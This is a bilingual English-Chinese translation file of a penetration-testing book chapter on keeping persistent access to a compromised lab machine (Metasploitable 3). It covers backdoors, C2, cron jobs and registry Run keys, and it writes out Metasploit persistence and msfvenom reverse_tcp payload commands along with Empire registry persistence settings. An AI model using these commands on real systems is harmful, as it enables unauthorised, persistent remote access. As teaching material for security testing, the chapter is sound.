- en: Maintaining Control within the Environment
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 在环境中保持控制
- en: Once you have obtained access to the target environment, you need to look at
    how you can maintain that access so that you are able to return. In a real-world
    attack, the attacker would create multiple backdoors or **Command and Control**
    (**C2**) channels so that access back into the compromised environment is easily
    attainable. In a penetration test, you would do the same.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦你进入了目标环境，你需要考虑如何维持访问，以便能够返回。在现实世界的攻击中，攻击者会创建多个后门或**命令和控制**（**C2**）通道，以便轻松地重新进入受损环境。在渗透测试中，你也会这样做。
- en: In this chapter, you will learn that maintaining access is an important step
    of keeping control of the target system as an exploit you may have used can be
    patched, which ultimately removes your temporary remote access. You will learn
    about the various techniques and tools that can be used and will be able to skillfully
    use the tools described in this chapter to create persistent access to a target
    system.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，你将了解到维持访问是保持对目标系统控制的重要步骤，因为你可能使用的利用可能会被修补，最终移除你的临时远程访问。你将学习可以使用的各种技术和工具，并能够熟练地使用本章描述的工具来创建对目标系统的持久访问。
- en: 'As you progress through this chapter, you will learn about the following topics:'
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 随着你在本章的学习过程中，你将了解以下主题：
- en: The importance of maintaining access
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 维持访问的重要性
- en: Techniques used to maintain access
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 用于维持访问的技术
- en: Using tools for persistence
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 使用持久性工具
- en: Technical requirements
  id: totrans-7
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 技术要求
- en: 'The following technical requirements are needed for this chapter:'
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: 本章需要以下技术要求：
- en: Kali Linux 2019.1
  id: totrans-9
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Kali Linux 2019.1
- en: Metasploitable 3
  id: totrans-10
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Metasploitable 3
- en: The importance of maintaining access
  id: totrans-11
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 维持访问的重要性
- en: In [Chapter 10](aa2258b0-f6da-4c68-a2e0-d9ef6d53d9ed.xhtml), *Moving Laterally
    and Escalating Your Privileges*, we performed post-exploitation and obtained access
    to the compromised host, which ended with us owning the domain. What happens if
    the vulnerability we exploited is patched or the IT staff have discovered there
    has been a compromise and have taken steps to remediate the gaps, which ultimately
    removes our access? We will need a way to get back into the target network or
    system. Sure, we can try additional exploits or even start from a social engineering
    attack—but this takes time and takes us a number of steps back. This is where
    maintaining access comes into play. Maintaining access should be a top priority
    once you have compromised the initial system. The objective is to obtain a persistent
    presence within the target to obtain a goal of in-depth access.
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: 在[第10章](aa2258b0-f6da-4c68-a2e0-d9ef6d53d9ed.xhtml)中，*横向移动和提升特权*，我们进行了后期利用，并获得了对受损主机的访问权限，最终拥有了该域。如果我们利用的漏洞被修补，或者IT人员发现已经受到了侵害并采取了措施来弥补漏洞，最终移除了我们的访问权限，会发生什么？我们需要一种方法重新进入目标网络或系统。当然，我们可以尝试其他利用或甚至从社会工程攻击开始，但这需要时间，让我们退了好几步。这就是维持访问的重要性所在。一旦你侵入了初始系统，维持访问应该是首要任务。目标是在目标内获得持久存在，以实现深度访问的目标。
- en: In the real world, there is a term that is used to define attackers who will
    often remain in a system for months before being detected. They are known as **Advanced
    Persistent Threats** (**APT**). An APT can be an attack campaign, a team of intruders,
    or even nation state actors who have a goal of stealing data, compromising sensitive
    data, or sabotaging critical infrastructure.
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 在现实世界中，有一个术语用来定义攻击者通常在被发现之前在系统中停留数月的情况。他们被称为**高级持续威胁**（**APT**）。APT可以是攻击活动、一组入侵者，甚至是国家行为者，他们的目标是窃取数据、侵犯敏感数据或破坏关键基础设施。
- en: Nation state actors are hackers who work for governments or countries in order
    to disrupt or compromise other governments or large organizations. There goal
    is to obtain highly valuable data and intelligence. An example of a nation state
    actor is "Chollima" from North Korea.
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: 国家行为者是为政府或国家工作的黑客，旨在破坏或侵犯其他政府或大型组织。他们的目标是获取高价值的数据和情报。朝鲜的"千里马"就是一个国家行为者的例子。
- en: During a penetration test, you don't focus on the unethical goals of an advanced
    persistent threat; instead, you focus on obtaining that level of persistence that
    these sophisticated attacks are capable of achieving.
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 在渗透测试中，你不会专注于高级持续威胁的非道德目标；相反，你会专注于获得这些复杂攻击能够实现的持久性水平。
- en: Techniques used to maintain access
  id: totrans-16
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 用于维持访问的技术
- en: When you initially compromise a target system, you have temporary access. Once
    the system reboots, that access is terminated. There are a number of techniques
    that can be used to maintain access. These span from tools and malware to using
    built-in system tools. Let's consider some of the various techniques that can
    be leveraged to maintain access.
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 当你最初侵入目标系统时，你拥有临时访问权限。一旦系统重新启动，该访问权限就会终止。有许多技术可以用来维持访问。这些技术涵盖了从工具和恶意软件到使用内置系统工具。让我们考虑一些可以利用的各种技术。
- en: Backdoor
  id: totrans-18
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 后门
- en: A backdoor enables easy access back into the compromised system. Trojans can
    be used for establishing backdoors. A trojan is a type of malware that's disguised
    as legitimate software, with the goal of dropping a malicious payload to enable
    remote access to the system. Trojans are capable of installing themselves as a
    service using privileged access, such as a local system. Trojans can also be used
    for data exfiltration.
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 后门可以轻松地重新进入受损系统。特洛伊木马可以用于建立后门。特洛伊木马是一种伪装成合法软件的恶意软件，其目标是释放恶意载荷，以实现对系统的远程访问。特洛伊木马能够使用特权访问安装自己作为服务，例如本地系统。特洛伊木马也可以用于数据外泄。
- en: The problem with using a trojan is that it can be detected by antivirus technologies.
    As we highlighted in [Chapter 11](9a3e2ffe-5ba3-4028-b0ac-86250f6218ba.xhtml), *Antivirus Evasion*,
    antiviruses have evolved and have sophisticated detection capabilities.
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: 使用特洛伊木马的问题在于它可能会被杀毒技术检测到。正如我们在[第11章](9a3e2ffe-5ba3-4028-b0ac-86250f6218ba.xhtml)中所强调的，*杀毒软件规避*，杀毒软件已经发展并具有复杂的检测能力。
- en: C2
  id: totrans-21
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: C2
- en: C2 servers are used to maintain communication with hosts that are compromised.
    This type of communication can spread from a simple heartbeat to fully-fledged
    commands that use the targeted system as a bot. Since this communication is initiated
    from the compromised host that's outbound to the C2 server, if you use ports that
    are known to be open, such as HTTP/HTTPS, the risk of detection is smaller.
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: C2服务器用于与受损主机保持通信。这种通信可以从简单的心跳到完全成熟的使用目标系统作为机器人的命令传播。由于这种通信是从受损主机向C2服务器发起的，如果您使用已知开放的端口，如HTTP/HTTPS，检测风险较小。
- en: Linux cron jobs
  id: totrans-23
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Linux cron作业
- en: On Linux systems, you have the ability to automatically start tasks. **Cron**
    is scheduler and can be used to run specific commands at a given time. These scheduled
    tasks are known as **cron jobs**. Within the operating system, these cron jobs
    are usually used to perform tasks such as backups, deleting log files, and monitoring.
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: 在Linux系统上，您可以自动启动任务。**Cron**是调度程序，可用于在特定时间运行特定命令。这些定期任务称为**cron作业**。在操作系统中，这些cron作业通常用于执行诸如备份、删除日志文件和监视等任务。
- en: You can leverage a cron job to run payloads that you may have generated using
    tools such as Metasploit. A simpler task can be using a cron job to create a netcat
    session that will connect back to you.
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 您可以利用cron作业来运行您可能使用诸如Metasploit之类的工具生成的有效负载。一个更简单的任务可以是使用cron作业创建一个netcat会话，该会话将连接回您。
- en: Living off the land
  id: totrans-26
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 利用现有资源生存
- en: Living off the land involves using your current operating system's tools to
    perform tasks. For example, you may user PowerShell to perform a number of tasks,
    from reconnaissance to maintaining a backdoor. The registry is a good way to set
    up persistent access. Leveraging the registry allows you to execute batch files
    and executables and even use functions within DLLs.
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 利用现有操作系统工具执行任务是“利用现有资源生存”。例如，您可以使用PowerShell执行多项任务，从侦察到维护后门。注册表是建立持久性访问的好方法。利用注册表可以执行批处理文件和可执行文件，甚至使用DLL中的函数。
- en: 'Focusing on the registry, it''s important to understand the difference between
    **HKEY_LOCAL_MACHINE** (**HKLM**) and **HKEY_CURRENT_USER** (**HKCU**). Keys defined
    in **HKLM** are run every time a system is booted, whereas **HKCU** is run once
    a user logs in. The keys that are defined here are the most common ones and are
    used to inject backdoors:'
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: 专注于注册表，了解**HKEY_LOCAL_MACHINE**（**HKLM**）和**HKEY_CURRENT_USER**（**HKCU**）之间的区别很重要。在**HKLM**中定义的键在系统启动时运行，而**HKCU**在用户登录后运行。在这里定义的键是最常见的，并用于注入后门：
- en: '[PRE0]'
  id: totrans-29
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: Notice that we have registry keys that are defined as `Run` and `RunOnce`. The
    `RunOnce` keys are run just once during boot or login, and then it is deleted,
    whereas the `Run` keys remain in place.
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: 请注意，我们有定义为`Run`和`RunOnce`的注册表键。`RunOnce`键在启动或登录时运行一次，然后被删除，而`Run`键保持不变。
- en: Using tools for persistence
  id: totrans-31
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 使用持久化工具
- en: Now that we have covered some of the techniques that can be used to maintain
    access, let's focus on some of the tools that are available. The first tool we
    will look at is the Metasploit Framework. The second tool we will cover is Empire.
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经介绍了一些用于保持访问的技术，让我们专注于一些可用的工具。我们将首先看一下Metasploit框架。我们将介绍的第二个工具是Empire。
- en: The Metasploit Framework
  id: totrans-33
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Metasploit框架
- en: We have covered Metasploit extensively in this book, that is, when we used it
    during many phases of a penetration test. When it comes to persistence, Metasploit
    has modules in this area, too.
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 我们在本书中广泛涵盖了Metasploit，也就是说，在渗透测试的许多阶段中使用了它。在持久性方面，Metasploit也有模块。
- en: My target system is the Metasploitable 3 virtual machine. I exploited it using
    `exploit/windows/smb/ms17_010_eternalblue`.
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: 我的目标系统是Metasploitable 3虚拟机。我使用了`exploit/windows/smb/ms17_010_eternalblue`来利用它。
- en: 'Once the meterpreter session has been created, you can use the `run persistence`
    command to leverage the built-in persistence script. We can see the options that
    are available in the following screenshot:'
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: 创建了meterpreter会话后，您可以使用`run persistence`命令利用内置的持久性脚本。我们可以在以下截图中看到可用的选项：
- en: '![](img/a9ac1c02-5c90-4853-8ecd-bd8fb9b06040.png)'
  id: totrans-37
  prefs: []
  type: TYPE_IMG
  zh: '![](img/a9ac1c02-5c90-4853-8ecd-bd8fb9b06040.png)'
- en: 'Figure 1: Meterpreter persistence script options'
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 图1：Meterpreter持久性脚本选项
- en: There is a warning that informs us that the Meterpreter scripts are deprecated
    and that we should use `/post/windows/manage/persistence_exe`. For now, let's
    stick with the deprecated script.
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: 有一个警告通知我们Meterpreter脚本已被弃用，我们应该使用`/post/windows/manage/persistence_exe`。现在，让我们坚持使用弃用的脚本。
- en: To obtain a persistence shell, we can use the `run persistence -U -i [seconds]
    -p [port] -r [host]` command.
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 要获得持久性shell，我们可以使用`run persistence -U -i [seconds] -p [port] -r [host]`命令。
- en: 'This command lets the agent start when the user logs on (`-U`). We define the
    interval in seconds (`-i`); we define the remote port (`-p`) and then the host
    to connect back to (`-r`). Once the script runs, we will see that a registry key
    has been set up and that persistence has been set up using a `.vbs` file:'
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: 这个命令让代理在用户登录时启动（`-U`）。我们以秒为单位定义间隔（`-i`）；我们定义远程端口（`-p`），然后是要连接回的主机（`-r`）。一旦脚本运行，我们将看到已设置一个注册表键，并且已使用`.vbs`文件设置了持久性：
- en: '![](img/4ff054e5-614f-4266-acc2-1d9858fb6bfd.png)'
  id: totrans-42
  prefs: []
  type: TYPE_IMG
  zh: '![](img/4ff054e5-614f-4266-acc2-1d9858fb6bfd.png)'
- en: 'Figure 2: Persistence setup using Meterpreter script'
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: 图2：使用Meterpreter脚本设置持久性
- en: Once the persistence script has been installed, the shell will reestablish every
    time the user logs in. However, we need to do one more thing, and that is to create
    a handler. This handler will listen for connections and create the remote session.
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: 安装了持久性脚本后，shell将在用户每次登录时重新建立。但是，我们还需要做一件事，那就是创建一个处理程序。这个处理程序将监听连接并创建远程会话。
- en: 'A simple handler can be set up using the following commands:'
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: 可以使用以下命令设置一个简单的处理程序：
- en: '[PRE1]'
  id: totrans-46
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: 'Remember that `LHOST` is the same IP address that you used in the persistence
    script, and that `LPORT` is the same port you defined in that script too. Once
    these commands have been executed, the reverse handler will start:'
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: 请记住，`LHOST`是持久性脚本中使用的相同IP地址，`LPORT`也是在该脚本中定义的相同端口。一旦执行了这些命令，反向处理程序就会启动：
- en: '![](img/439dc434-00c2-45a9-be39-4cd31d8ee1e8.png)'
  id: totrans-48
  prefs: []
  type: TYPE_IMG
  zh: '![](img/439dc434-00c2-45a9-be39-4cd31d8ee1e8.png)'
- en: 'Figure 3: Creating a handler in Metasploit'
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 图3：在Metasploit中创建处理程序
- en: Now, you have everything set up for the remote shell to connect back to you,
    even if the target system has been rebooted. You can test this out by restarting
    the Metasploitable 3 virtual machine. Once the machine boots up and a user logs
    in, the meterpreter session will be established.
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，你已经为远程shell连接做好了一切准备，即使目标系统已经重启。你可以通过重新启动Metasploitable 3虚拟机来测试这一点。一旦机器启动并有用户登录，meterpreter会话将建立连接。
- en: Let's look at the recommended post module that meterpreter mentioned earlier.
    In order to use `/post/windows/manage/persistence_exe`, you need to have created
    a payload. I created a simple payload using MSFvenom.
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们看一下meterpreter之前提到的推荐的后置模块。为了使用`/post/windows/manage/persistence_exe`，你需要创建一个有效载荷。我使用MSFvenom创建了一个简单的有效载荷。
- en: The command that's used to create the `payload.exe` file that you can see in
    the preceding screenshot is `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP
    LPORT=1338 -f exe -o /root/Desktop/payload.exe`.Take note of the port number—it
    is different to the one we used earlier.
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: 在上面的屏幕截图中，用于创建在之前屏幕截图中看到的`payload.exe`文件的命令是`msfvenom -p windows/meterpreter/reverse_tcp
    LHOST=IP LPORT=1338 -f exe -o /root/Desktop/payload.exe`。请注意端口号——它与我们之前使用的不同。
- en: 'Once you have generated the payload, you can use the following command within
    a Meterpreter session:'
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦生成了有效载荷，你可以在Meterpreter会话中使用以下命令：
- en: '[PRE2]'
  id: totrans-54
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: '`REXEPATH` is used to define the location of the payload you created in your
    Kali environment. `STARTUP` is used to define the startup type (`User`, `System`,
    or `Service`); this will dictate which registry key will be used. Once you enter
    the preceding command, Metasploit will perform the persistence attack and create
    an autorun within the registry, as shown in the following screenshot:'
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: '`REXEPATH`用于定义你在Kali环境中创建的有效载荷的位置。`STARTUP`用于定义启动类型（`User`、`System`或`Service`）；这将决定使用哪个注册表键。一旦输入了上述命令，Metasploit将执行持久性攻击，并在注册表中创建一个自动运行，如下面的屏幕截图所示：'
- en: '![](img/8cbb70a3-9617-4f03-b319-36bd6f0e9d30.png)'
  id: totrans-56
  prefs: []
  type: TYPE_IMG
  zh: '![](img/8cbb70a3-9617-4f03-b319-36bd6f0e9d30.png)'
- en: 'Figure 4: Persistence using a malicious payload'
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: 图4：使用恶意有效载荷的持久性
- en: Once this is done and you exit out of them Meterpreter session, create a new
    handler. Remember to define a different port number.
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦完成这些操作并退出Meterpreter会话，创建一个新的处理程序。记得定义一个不同的端口号。
- en: 'In the following screenshot, note the two sessions I established:'
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: 在以下的屏幕截图中，请注意我建立的两个会话：
- en: '![](img/247fb37e-c99b-4e4d-973e-9341b35f7864.png)'
  id: totrans-60
  prefs: []
  type: TYPE_IMG
  zh: '![](img/247fb37e-c99b-4e4d-973e-9341b35f7864.png)'
- en: 'Figure 5: Establishing sessions using Meterpreter'
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: 图5：使用Meterpreter建立会话
- en: 'By using `regedit` on the target machine, we can verify that the registry key
    exists:'
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: 通过在目标机器上使用`regedit`，我们可以验证注册表键是否存在：
- en: '![](img/1b841f19-605d-4bdb-a586-22780de07999.png)'
  id: totrans-63
  prefs: []
  type: TYPE_IMG
  zh: '![](img/1b841f19-605d-4bdb-a586-22780de07999.png)'
- en: 'Figure 6: Registry key created by the persistence modules in Metasploit'
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: 图6：Metasploit中持久性模块创建的注册表键
- en: The persistence modules in the Metasploit Framework are really powerful. In
    a real penetration test, if you were using Metasploit to maintain access, you
    would leverage an undetectable payload since the antivirus would probably delete
    the payload being dropped onto the target system's disk.
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit框架中的持久性模块非常强大。在真实的渗透测试中，如果你使用Metasploit来保持访问，你将利用一个不可检测的有效载荷，因为杀毒软件可能会删除被释放到目标系统磁盘上的有效载荷。
- en: Empire
  id: totrans-66
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: Empire
- en: 'Let''s focus on the persistence modules that Empire offers. These modules are
    broken down into five categories:'
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们专注于Empire提供的持久性模块。这些模块分为五类：
- en: '**PowerBreach**: These focus on memory resident backdoors. These do not persist
    after a reboot.'
  id: totrans-68
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**PowerBreach**：这些专注于内存驻留后门。它们在重启后不会存在。'
- en: '**Userland**: These persist after a reboot but work once a defined user logs
    in. This is not an administrative persistence module.'
  id: totrans-69
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Userland**：这些在重启后仍然存在，但只有在特定用户登录时才有效。这不是一个管理员持久性模块。'
- en: '**Elevated**: These allow for persistence using an administrative context.
    They persist after a reboot.'
  id: totrans-70
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**提升权限**：这些允许在管理员上下文中使用持久性。它们在重启后仍然存在。'
- en: '**Debugger**: These enable persistence using various tools that are available
    prior to an RDP login. For example, you can leverage a command prompt shell running
    as `SYSTEM` without the need to log in to the target.'
  id: totrans-71
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Debugger**：这些使用各种工具在RDP登录之前实现持久性。例如，你可以利用一个作为`SYSTEM`运行的命令提示符shell，而无需登录到目标机器。'
- en: '**Misc**: These are miscellaneous methods of persistence, for example, leveraging
    the Mimikatz tool to obtain the machine account password.'
  id: totrans-72
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Misc**：这些是持久性的其他方法，例如，利用Mimikatz工具获取机器账户密码。'
- en: 'In the following screenshot, I have an active agent for the Metasploitable
    3 virtual machine:'
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: 在下面的屏幕截图中，我有一个针对Metasploitable 3虚拟机的活动代理：
- en: '![](img/66c791f3-fbe0-4d49-ac66-fc4552b20894.png)'
  id: totrans-74
  prefs: []
  type: TYPE_IMG
  zh: '![](img/66c791f3-fbe0-4d49-ac66-fc4552b20894.png)'
- en: 'Figure 7: Active agent in Empire'
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 图7：Empire中的活动代理
- en: 'Using the `persistence/userland/registry` module, we will leverage the **HKCU**
    registry hive to implant a persistence module within the user context. This script
    will only run when the user logs in:'
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: 使用`persistence/userland/registry`模块，我们将利用**HKCU**注册表来在用户上下文中植入一个持久性模块。这个脚本只会在用户登录时运行：
- en: '![](img/5a7ead32-e1d4-451c-b900-f14338ef3a87.png)'
  id: totrans-77
  prefs: []
  type: TYPE_IMG
  zh: '![](img/5a7ead32-e1d4-451c-b900-f14338ef3a87.png)'
- en: 'Figure 8: Using a persistence module in the user context'
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 图8：在用户上下文中使用持久性模块
- en: Once the command executes, we will receive some output, which defines which
    registry key was modified and that can be added in the script. In the case of
    the userland module, it was set in `HKCU:Software\Microsoft\Windows\CurrentVersion\Debug`.
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦命令执行，我们将收到一些输出，其中定义了修改的注册表键，并可以将其添加到脚本中。在用户空间模块的情况下，它设置在`HKCU:Software\Microsoft\Windows\CurrentVersion\Debug`中。
- en: 'Now, let''s try an elevated persistence module. We will use the `persistence/elevated/registry`
    module for this. This uses the **HKLM** registry hive to implant a script that
    will run when the target system is booted. We will further modify this module
    to define our own registry location (using the `set RegPath HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run` command)
    and key (using the `set KeyName` command and some random characters):'
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，让我们尝试一个提升的持久性模块。我们将使用`persistence/elevated/registry`模块。这使用**HKLM**注册表来植入一个脚本，该脚本将在目标系统启动时运行。我们将进一步修改此模块以定义我们自己的注册表位置（使用`set
    RegPath HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run`命令）和键（使用`set KeyName`命令和一些随机字符）：
- en: '![](img/c5bad543-550a-4f2e-b5af-ae18e9ef7e30.png)'
  id: totrans-81
  prefs: []
  type: TYPE_IMG
  zh: '![](img/c5bad543-550a-4f2e-b5af-ae18e9ef7e30.png)'
- en: 'Figure 9: Using a persistence module in the elevated system context'
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 图9：在提升的系统上下文中使用持久性模块
- en: Once the command executes, the registry key will be set and we will have a persistent
    connection to the remote system.
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 一旦命令执行，注册表键将被设置，我们将对远程系统有持久的连接。
- en: 'Using `regedit` on the target machine, we can verify that the registry key
    exists:'
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 在目标机器上使用`regedit`，我们可以验证注册表键是否存在：
- en: '![](img/477ccb3d-4f64-4d16-908c-97f3dbf9fc18.png)'
  id: totrans-85
  prefs: []
  type: TYPE_IMG
  zh: '![](img/477ccb3d-4f64-4d16-908c-97f3dbf9fc18.png)'
- en: 'Figure 10: Registry key set by Empire'
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 图10：Empire设置的注册表键
- en: Empire has a wealth of persistence modules that can be used. These span across
    the registry, scheduled tasks, and more. Experimenting with them in your lab will
    help you to gain a good understanding of how each one works.
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: Empire拥有丰富的持久性模块可供使用。这些模块涵盖了注册表、计划任务等等。在实验室中尝试它们将帮助您充分了解每个模块的工作原理。
- en: Summary
  id: totrans-88
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 摘要
- en: Maintaining access is an important part of a penetration testing engagement.
    It saves you from having to re-exploit the target system. Remember that the exploit
    you may have used initially could have been patched since you last used it. Therefore,
    you need to have another way of accessing the target system to save you from finding
    new exploits and wasting time.
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 保持访问是渗透测试的重要部分。这可以避免您不得不重新利用目标系统。请记住，您最初可能使用的漏洞可能自您上次使用以来已经修补。因此，您需要另一种访问目标系统的方式，以免找到新的漏洞并浪费时间。
- en: In this chapter, you gained insight into the various techniques that can be
    used to maintain access in a target environment. You gained the skills to identify
    specific keys of the Windows registry, and how they can be used for persistence.
    Finally, you learned how to use various tools to maintain access to a target system.
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，您了解了可以用于在目标环境中保持访问的各种技术。您学会了识别Windows注册表的特定键以及它们如何用于持久性。最后，您学会了如何使用各种工具来保持对目标系统的访问。
- en: In [Chapter 13](f55668af-c222-4014-9d64-1135149d6215.xhtml), *Reporting and
    Acting on Your Findings*, we will discuss how to write a penetration test report
    and how to identify and recommend remediation steps based on these findings.
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: 在[第13章](f55668af-c222-4014-9d64-1135149d6215.xhtml)中，*报告和处理您的发现*，我们将讨论如何撰写渗透测试报告以及如何根据这些发现确定和推荐补救措施。
- en: Questions
  id: totrans-92
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 问题
- en: Why do you need to maintain access?
  id: totrans-93
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 为什么需要保持访问？
- en: What is an APT?
  id: totrans-94
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 什么是APT？
- en: Name two techniques that can be used to maintain access.
  id: totrans-95
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 列举两种可以用于保持访问的技术。
- en: What does "living off the land" mean?
  id: totrans-96
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: “living off the land”是什么意思？
- en: What is the difference between HKCU and HKLM?
  id: totrans-97
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: HKCU和HKLM之间有什么区别？
